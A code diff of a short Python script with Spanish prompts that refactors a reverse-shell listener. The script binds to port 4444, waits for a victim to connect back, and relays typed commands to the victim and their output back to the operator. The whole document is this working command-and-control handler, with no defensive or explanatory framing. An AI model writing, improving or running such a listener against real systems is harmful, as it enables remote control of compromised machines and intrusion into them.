@@ -1,28 +1,22 @@
 import socket
 
-# Configuración
-IP_SERVIDOR = "0.0.0.0"
-PUERTO = 4444
+LISTEN_IP = "0.0.0.0"
+PORT = 4444
 
-# Crear socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.bind((IP_SERVIDOR, PUERTO))
+s.bind((LISTEN_IP, PORT))
 s.listen(1)
+print(f"[*] Esperando conexión en {PORT}...")
 
-print(f"Esperando conexión en {PUERTO}...")
-
-# Aceptar conexión
-cliente, addr = s.accept()
-print(f"Conexión recibida de {addr}")
+conn, addr = s.accept()
+print(f"[+] Conexión recibida de {addr}")
 
 while True:
-    comando = input("Shell> ")
-    if comando.lower() == "exit":
+    command = input("$ ")  
+    conn.send(command.encode())
+    if command.lower() == "exit":
         break
+    response = conn.recv(4096).decode()
+    print(response)
 
-    cliente.send(comando.encode())
-    respuesta = cliente.recv(4096).decode()
-    print(respuesta)
-
-cliente.close()
-s.close()
+conn.close()
